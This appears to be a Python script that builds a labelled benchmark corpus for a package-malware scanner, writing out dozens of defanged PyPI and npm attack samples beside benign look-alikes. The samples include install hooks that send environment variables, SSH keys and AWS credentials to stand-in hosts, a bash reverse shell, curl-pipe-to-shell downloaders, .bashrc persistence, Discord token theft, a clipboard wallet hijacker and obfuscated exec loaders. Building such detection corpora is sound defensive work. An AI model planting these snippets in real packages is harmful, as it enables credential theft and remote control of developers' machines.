"""Materialise the labelled evaluation corpus under bench/corpus/.

Every malicious sample is a *defanged* re-creation of a publicly documented
supply-chain attack technique: endpoints use reserved `.invalid` / `example`
domains and documentation IP ranges, and nothing here is ever executed —
Sniffdog only reads it. Benign samples imitate the legitimate code that most
often trips naive scanners.
"""

from __future__ import annotations

import base64
import json
import shutil
import zlib
from pathlib import Path

ROOT = Path(__file__).parent / "corpus"


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


SETUP_HEAD = "from setuptools import setup\n"

MALICIOUS: dict[str, dict[str, str]] = {
    # --- PyPI ------------------------------------------------------------------------------------
    "py-setup-env-exfil": {  # 2022-2023 typosquat waves: install hook ships the whole environment
        "setup.py": SETUP_HEAD
        + """import os, json, urllib.request
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        body = json.dumps(dict(os.environ)).encode()
        urllib.request.urlopen(urllib.request.Request("https://collect.example.invalid/e", data=body))
        install.run(self)

setup(name="requessts", version="1.0.0", cmdclass={"install": PostInstall})
""",
    },
    "py-ctx-import-time": {  # ctx (May 2022): hijacked package leaked env vars on import
        "setup.py": SETUP_HEAD + 'setup(name="ctx-utils", version="0.2.2", packages=["ctx_utils"])\n',
        "ctx_utils/__init__.py": """import os
import requests

class Ctx(dict):
    def __init__(self):
        super().__init__()
        self.sendRequest()

    def sendRequest(self):
        string = ""
        for _, value in os.environ.items():
            string += value + " "
        requests.get("https://ctx-dump.example.invalid/hacked/" + string)

_ctx = Ctx()
""",
    },
    "py-layered-b64": {  # two layers of base64 hiding an SSH key thief
        "setup.py": SETUP_HEAD
        + "import base64\nexec(base64.b64decode('"
        + b64(
            "import base64\nexec(base64.b64decode('"
            + b64(
                "import os, urllib.request\nk = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                "urllib.request.urlopen('https://keys.example.invalid/', data=k.encode())\n"
            )
            + "'))\n"
        )
        + "'))\nsetup(name='fastjsonx', version='0.1')\n",
    },
    "py-dns-beacon": {  # dependency-confusion "research" beacons: user+host over DNS during install
        "setup.py": SETUP_HEAD
        + """import socket, getpass, binascii

def beacon():
    data = f"{getpass.getuser()}|{socket.gethostname()}".encode()
    label = binascii.hexlify(data).decode()[:60]
    try:
        socket.gethostbyname(label + ".b.oastify.com")
    except OSError:
        pass

beacon()
setup(name="acme-internal-auth", version="99.0.0")
""",
    },
    "py-download-exec": {  # W4SP-style first stage: fetch a paste and exec it at import time
        "setup.py": SETUP_HEAD + 'setup(name="pycolorterm", version="1.2.0", packages=["pycolorterm"])\n',
        "pycolorterm/__init__.py": """from urllib.request import urlopen as _u
exec(_u("https://pastebin.com/raw/XXXXdemo").read())
""",
    },
    "py-pth-persistence": {  # .pth executes on every interpreter start
        "setup.py": SETUP_HEAD + 'setup(name="py-telemetry-helper", version="0.0.3", data_files=[("", ["zz_helper.pth"])])\n',
        "zz_helper.pth": "import base64; exec(base64.b64decode('"
        + b64("import os,urllib.request;urllib.request.urlopen('https://t.example.invalid/', data=repr(os.environ).encode())")
        + "'))\n",
    },
    "py-discord-token-stealer": {
        "setup.py": SETUP_HEAD + 'setup(name="discord-fast-embed", version="2.0.1", packages=["dfe"])\n',
        "dfe/__init__.py": """import os, re, json, urllib.request

WEBHOOK = "https://discord.com/api/webhooks/000000000000000000/defanged-token-value"

def grab():
    tokens = []
    root = os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb")
    for name in os.listdir(root):
        with open(os.path.join(root, name), errors="ignore") as fh:
            for t in re.findall(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", fh.read()):
                tokens.append(t)
    return tokens

def send():
    payload = json.dumps({"content": "\\n".join(grab())}).encode()
    req = urllib.request.Request(WEBHOOK, data=payload, headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req)

send()
""",
    },
    "py-bashrc-persistence": {
        "setup.py": SETUP_HEAD
        + """import os
from setuptools.command.develop import develop

class Dev(develop):
    def run(self):
        with open(os.path.expanduser("~/.bashrc"), "a") as fh:
            fh.write("\\ncurl -s https://upd.example.invalid/u.sh | sh &\\n")
        develop.run(self)

setup(name="devtool-helpers", version="0.4", cmdclass={"develop": Dev})
""",
    },
    "py-whitespace-hidden": {  # payload pushed hundreds of columns to the right
        "setup.py": SETUP_HEAD + 'setup(name="pandas-helpers-x", version="0.1", packages=["phx"])\n',
        "phx/__init__.py": "VERSION = '0.1'"
        + " " * 220
        + ";import subprocess;subprocess.Popen('curl -s https://cdn.example.invalid/x | sh', shell=True)\n",
    },
    "py-reverse-shell": {
        "setup.py": SETUP_HEAD
        + """import subprocess
subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"], start_new_session=True)
setup(name="setup-tools-ext", version="1.0")
""",
    },
    "py-getattr-obfuscation": {
        "setup.py": SETUP_HEAD
        + """m = __import__("o" + "s")
getattr(m, "sys" + "tem")("wget -q -O- https://get.example.invalid/p | sh")
setup(name="numpy-addons", version="0.0.1")
""",
    },
    "py-dropper": {
        "setup.py": SETUP_HEAD
        + """import os, tempfile, urllib.request
from setuptools.command.install import install

class I(install):
    def run(self):
        dst = os.path.join(tempfile.gettempdir(), "svc")
        urllib.request.urlretrieve("http://198.51.100.20/bin/svc", dst)
        os.chmod(dst, 0o755)
        os.system(dst + " &")
        install.run(self)

setup(name="graphql-utils-pro", version="3.1.0", cmdclass={"install": I})
""",
    },
    "py-zlib-exec": {
        "setup.py": SETUP_HEAD
        + "import zlib, base64\nexec(zlib.decompress(base64.b64decode('"
        + base64.b64encode(
            zlib.compress(
                b"import os,socket\ns=socket.create_connection(('collector.example.invalid',443))\ns.sendall(open(os.path.expanduser('~/.aws/credentials'),'rb').read())\n"
            )
        ).decode()
        + "')))\nsetup(name='aws-cli-tools', version='1.0')\n",
    },
    "py-colourama-clipper": {  # colourama (2018): typosquat + Bitcoin clipboard hijacker
        "setup.py": SETUP_HEAD + 'setup(name="colourama", version="0.4.6", packages=["colourama"])\n',
        "colourama/__init__.py": """import re, time, threading
import pyperclip

WALLET = "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"

def _watch():
    while True:
        if re.match(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", pyperclip.paste() or ""):
            pyperclip.copy(WALLET)
        time.sleep(0.5)

threading.Thread(target=_watch, daemon=True).start()
""",
    },
    "py-disguised-binary": {
        "setup.py": SETUP_HEAD + 'setup(name="img-utils-lite", version="0.2", package_data={"": ["assets/logo.png"]})\n',
        "assets/logo.png": "\x7fELF\x02\x01\x01" + "\x00" * 64,
    },
    "py-interprocedural": {  # data passes through a class, a helper and a container before leaving
        "setup.py": SETUP_HEAD + 'setup(name="metrics-collector-lite", version="0.9", packages=["mcl"])\n',
        "mcl/__init__.py": """import os, http.client, json
from pathlib import Path

class Collector:
    def __init__(self):
        self.items = []

    def gather(self):
        self.items.append(Path.home().joinpath(".aws", "credentials").read_text())
        self.items.append(os.environ.copy())
        return self.items

def _ship(blob):
    conn = http.client.HTTPSConnection("metrics.example.invalid")
    conn.request("POST", "/ingest", body=blob)

def start():
    c = Collector()
    _ship(json.dumps(c.gather(), default=str))

start()
""",
    },
    # --- npm -------------------------------------------------------------------------------------
    "js-postinstall-env": {
        "package.json": json.dumps(
            {"name": "lodash-utils-pro", "version": "1.0.3", "main": "index.js", "scripts": {"postinstall": "node collect.js"}}, indent=2
        ),
        "index.js": "module.exports = require('lodash');\n",
        "collect.js": """const https = require("https");
const os = require("os");
const data = JSON.stringify({ env: process.env, host: os.hostname(), user: os.userInfo().username, cwd: process.cwd() });
const req = https.request({ hostname: "collect.example.invalid", path: "/n", method: "POST" });
req.write(data);
req.end();
""",
    },
    "js-event-stream-style": {  # flatmap-stream (2018): AES-encrypted payload decrypted and evaluated
        "package.json": json.dumps({"name": "flatmap-streamx", "version": "0.1.1", "main": "index.min.js"}, indent=2),
        "index.min.js": """var Stream=require("stream").Stream;module.exports=function(e,n){var i=new Stream;return i};
!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,"hex").toString()}var n=r(e("2e2f746573742f64617461")),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,""),f.exports(n[1])}catch(r){}}();
""",
    },
    "js-preinstall-curl": {  # ua-parser-js (Oct 2021): preinstall fetched and ran a miner
        "package.json": json.dumps(
            {"name": "ua-parser-jsx", "version": "0.7.29", "scripts": {"preinstall": "start /B node preinstall.js & node preinstall.js"}},
            indent=2,
        ),
        "preinstall.js": """const { exec } = require("child_process");
const os = require("os");
if (os.type() === "Linux") {
  exec("curl -s http://198.51.100.9/download/jsextension -o jsextension; chmod +x jsextension; ./jsextension -k --tls --rig-id q");
}
""",
    },
    "js-dns-exfil": {
        "package.json": json.dumps(
            {"name": "corp-internal-sdk", "version": "99.9.9", "scripts": {"preinstall": "node index.js"}}, indent=2
        ),
        "index.js": """const dns = require("dns");
const os = require("os");
const id = Buffer.from([os.hostname(), os.userInfo().username, process.cwd()].join(":")).toString("hex");
for (let i = 0; i < id.length; i += 60) {
  dns.lookup(`${id.slice(i, i + 60)}.${i}.x.interact.sh`, () => {});
}
""",
    },
    "js-obfuscator": {
        "package.json": json.dumps({"name": "react-dom-helpers", "version": "2.1.0", "main": "index.js"}, indent=2),
        "index.js": "".join(f"var _0x{i:04x}a=['\\x68\\x74\\x74\\x70\\x73','\\x67\\x65\\x74'];" for i in range(20))
        + "\nconst _0xfeed=require(Buffer.from('aHR0cHM=','base64').toString());"
        + "_0xfeed.get('https://c2.example.invalid/s',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d));});\n",
    },
    "js-ssh-key-theft": {
        "package.json": json.dumps({"name": "eslint-config-airbnbx", "version": "19.0.4", "type": "module", "main": "index.js"}, indent=2),
        "index.js": """import fs from "fs";
import os from "os";
import path from "path";
import fetch from "node-fetch";

const files = ["id_rsa", "id_ed25519"].map((f) => path.join(os.homedir(), ".ssh", f));
const loot = files.filter(fs.existsSync).map((f) => fs.readFileSync(f, "utf8"));
await fetch("https://keys.example.invalid/k", { method: "POST", body: JSON.stringify(loot) });
export default {};
""",
    },
    "js-remote-eval": {
        "package.json": json.dumps({"name": "colors-ext", "version": "1.4.44", "main": "lib/index.js"}, indent=2),
        "lib/index.js": """const https = require("node:https");
https.get("https://raw.example.invalid/stage2.js", (res) => {
  let body = "";
  res.on("data", (chunk) => (body += chunk));
  res.on("end", () => new Function(body)());
});
""",
    },
    "js-b64-child-process": {
        "package.json": json.dumps({"name": "noblox.js-proxy", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}}, indent=2),
        "setup.js": "const cp = require('child_process');\ncp.exec(Buffer.from('"
        + b64('powershell -w hidden -c "iwr https://drop.example.invalid/a.exe -OutFile $env:TEMP\\a.exe; & $env:TEMP\\a.exe"')
        + "', 'base64').toString());\n",
    },
    "js-bashrc-persistence": {
        "package.json": json.dumps({"name": "node-shell-utils", "version": "0.0.9", "scripts": {"install": "node install.js"}}, indent=2),
        "install.js": """const fs = require("fs");
const os = require("os");
fs.appendFileSync(os.homedir() + "/.bashrc", "\\n(curl -fsSL https://u.example.invalid/i.sh | bash) >/dev/null 2>&1 &\\n");
""",
    },
    "js-inline-node-e": {
        "package.json": json.dumps(
            {
                "name": "chalk-template-x",
                "version": "4.1.3",
                "scripts": {
                    "preinstall": "node -e \"eval(Buffer.from('"
                    + b64("require('https').get('https://p.example.invalid/'+process.env.NPM_TOKEN)")
                    + "','base64').toString())\""
                },
            },
            indent=2,
        ),
    },
    "js-scope-squat": {  # @typescript_eslinter/eslint (2024): fake scope, install-time payload
        "package.json": json.dumps(
            {"name": "@typescript_eslinter/eslint", "version": "8.57.1", "main": "index.js", "scripts": {"postinstall": "node install.js"}},
            indent=2,
        ),
        "index.js": "module.exports = require('eslint');\n",
        "install.js": """const axios = require("axios");
const os = require("os");
axios.post("https://webhook.site/00000000-0000-0000-0000-000000000000", { env: process.env, host: os.hostname() });
""",
    },
    "js-discord-webhook": {
        "package.json": json.dumps({"name": "discord-selfbot-v14", "version": "1.0.2", "main": "index.js"}, indent=2),
        "index.js": """const fetch = require("node-fetch");
const fs = require("fs");
const p = process.env.APPDATA + "/discord/Local Storage/leveldb/000003.log";
const raw = fs.readFileSync(p, "utf8");
const tokens = raw.match(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g);
fetch("https://discord.com/api/webhooks/000000000000000000/defanged", { method: "POST", body: JSON.stringify({ content: tokens }) });
""",
    },
}

BENIGN: dict[str, dict[str, str]] = {
    "py-setup-version-exec": {  # very common setup.py idioms
        "setup.py": """import os, re, subprocess
from setuptools import setup, find_packages
from setuptools.command.build_ext import build_ext

about = {}
here = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(here, "pkg", "__version__.py")) as f:
    exec(f.read(), about)

def git_rev():
    try:
        return subprocess.check_output(["git", "rev-parse", "--short", "HEAD"]).decode().strip()
    except Exception:
        return "unknown"

class BuildExt(build_ext):
    def run(self):
        subprocess.check_call(["cmake", "--build", "build"])
        build_ext.run(self)

setup(name="pkg", version=about["__version__"], packages=find_packages(), cmdclass={"build_ext": BuildExt})
""",
        "pkg/__init__.py": "from .__version__ import __version__\n",
        "pkg/__version__.py": "__version__ = '1.2.3'\n",
    },
    "py-api-client-token": {  # SDKs legitimately send a token from the environment to their own API
        "setup.py": 'from setuptools import setup\nsetup(name="weatherapi-client", version="2.0.0", packages=["weatherapi"])\n',
        "weatherapi/__init__.py": """import os
import requests

API = os.environ.get("WEATHER_API_URL", "https://api.weather.example.com/v1")

class Client:
    def __init__(self, token=None):
        self.token = token or os.environ.get("WEATHER_API_TOKEN")
        self.session = requests.Session()
        self.session.proxies.update({"https": os.environ.get("HTTPS_PROXY", "")})

    def forecast(self, city):
        r = self.session.get(f"{API}/forecast", params={"q": city}, headers={"Authorization": f"Bearer {self.token}"}, timeout=10)
        r.raise_for_status()
        return r.json()
""",
    },
    "py-model-downloader": {  # libraries that download data on demand
        "setup.py": 'from setuptools import setup\nsetup(name="tinymodels", version="0.3.0", packages=["tinymodels"])\n',
        "tinymodels/hub.py": """import os, hashlib, urllib.request
CACHE = os.path.join(os.path.expanduser("~"), ".cache", "tinymodels")

def download(name, sha256):
    os.makedirs(CACHE, exist_ok=True)
    path = os.path.join(CACHE, name)
    if not os.path.exists(path):
        with urllib.request.urlopen(f"https://models.example.com/{name}") as r, open(path, "wb") as f:
            f.write(r.read())
    if hashlib.sha256(open(path, "rb").read()).hexdigest() != sha256:
        raise ValueError("checksum mismatch")
    return path
""",
        "tinymodels/__init__.py": "from .hub import download\n",
    },
    "py-cli-subprocess": {
        "setup.py": 'from setuptools import setup\nsetup(name="gitstats-cli", version="1.0.0", packages=["gitstats"], entry_points={"console_scripts": ["gitstats=gitstats.cli:main"]})\n',
        "gitstats/cli.py": """import argparse, os, subprocess, sys

def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("repo")
    a = p.parse_args(argv)
    out = subprocess.run(["git", "-C", a.repo, "log", "--oneline"], capture_output=True, text=True, env=os.environ, check=True)
    print(len(out.stdout.splitlines()), "commits")
    if os.environ.get("GITSTATS_EDITOR"):
        os.system(os.environ["GITSTATS_EDITOR"] + " report.txt")

if __name__ == "__main__":
    sys.exit(main())
""",
        "gitstats/__init__.py": "",
    },
    "py-namespace-pth": {  # legacy namespace-package .pth shim
        "setup.py": 'from setuptools import setup\nsetup(name="zope.thing", version="5.0")\n',
        "zope.thing-nspkg.pth": "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('zope',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');m = has_mfs and sys.modules.setdefault('zope', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('zope', [os.path.dirname(p)])));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
    },
    "py-telemetry-optout": {  # anonymous usage stats, opt-out documented; hostname hashed
        "setup.py": 'from setuptools import setup\nsetup(name="fastplot", version="0.9.1", packages=["fastplot"])\n',
        "fastplot/telemetry.py": """import hashlib, os, platform, threading
import requests

def ping(event):
    if os.environ.get("FASTPLOT_NO_TELEMETRY"):
        return
    body = {"event": event, "py": platform.python_version()}
    threading.Thread(target=requests.post, args=("https://telemetry.fastplot.example.com/v1",), kwargs={"json": body, "timeout": 2}).start()
""",
        "fastplot/__init__.py": "from . import telemetry\n",
    },
    "py-tests-with-payloads": {  # a security library whose *tests* contain attack strings
        "setup.py": 'from setuptools import setup\nsetup(name="sanitizer", version="1.0", packages=["sanitizer"])\n',
        "sanitizer/__init__.py": "import html\n\ndef clean(s):\n    return html.escape(s)\n",
        "tests/test_payloads.py": """import base64
PAYLOADS = ["bash -i >& /dev/tcp/203.0.113.1/4444 0>&1", "curl https://x.example.invalid | sh"]

def test_decode():
    exec(base64.b64decode("cHJpbnQoMSk="))
""",
    },
    "js-native-addon": {
        "package.json": json.dumps(
            {
                "name": "fast-hash-native",
                "version": "3.0.1",
                "main": "index.js",
                "scripts": {"install": "node-gyp-build"},
                "dependencies": {"node-gyp-build": "^4.8.0"},
            },
            indent=2,
        ),
        "index.js": "module.exports = require('node-gyp-build')(__dirname);\n",
        "binding.gyp": json.dumps({"targets": [{"target_name": "hash", "sources": ["src/hash.cc"]}]}),
    },
    "js-http-client-env": {
        "package.json": json.dumps({"name": "tiny-api-client", "version": "2.3.0", "main": "index.js"}, indent=2),
        "index.js": """const axios = require("axios");
const { spawn } = require("child_process");

const client = axios.create({
  baseURL: process.env.API_URL || "https://api.example.com",
  headers: { "User-Agent": "tiny-api-client" },
  proxy: process.env.HTTPS_PROXY ? { host: process.env.HTTPS_PROXY } : false,
});

function openEditor(file) {
  return spawn(process.env.EDITOR || "vi", [file], { stdio: "inherit", env: process.env });
}

module.exports = { get: (p) => client.get(p), openEditor };
""",
    },
    "js-build-tool": {
        "package.json": json.dumps(
            {
                "name": "mini-bundler",
                "version": "1.1.0",
                "bin": {"mini-bundler": "cli.js"},
                "scripts": {"prepare": "npm run build", "build": "node build.js"},
            },
            indent=2,
        ),
        "cli.js": """#!/usr/bin/env node
const fs = require("fs");
const vm = require("vm");
const path = require("path");
const entry = path.resolve(process.argv[2] || "index.js");
const code = fs.readFileSync(entry, "utf8");
const ctx = vm.createContext({ console, require });
vm.runInContext(code, ctx, { filename: entry });
""",
        "build.js": "console.log('built');\n",
    },
    "js-dotenv-loader": {
        "package.json": json.dumps({"name": "env-loader-lite", "version": "1.0.0", "main": "index.js"}, indent=2),
        "index.js": """const fs = require("fs");
const path = require("path");
function load(file = path.join(process.cwd(), ".env")) {
  if (!fs.existsSync(file)) return {};
  for (const line of fs.readFileSync(file, "utf8").split("\\n")) {
    const m = line.match(/^([\\w.-]+)=(.*)$/);
    if (m && !(m[1] in process.env)) process.env[m[1]] = m[2];
  }
  return process.env;
}
module.exports = { load };
""",
    },
}


def build() -> None:
    if ROOT.exists():
        shutil.rmtree(ROOT)
    for label, group in (("malicious", MALICIOUS), ("benign", BENIGN)):
        for name, files in group.items():
            for rel, content in files.items():
                p = ROOT / label / name / rel
                p.parent.mkdir(parents=True, exist_ok=True)
                if rel.endswith(".png"):
                    p.write_bytes(content.encode("latin-1"))
                else:
                    p.write_text(content)
    print(f"corpus: {len(MALICIOUS)} malicious, {len(BENIGN)} benign samples -> {ROOT}")


if __name__ == "__main__":
    build()
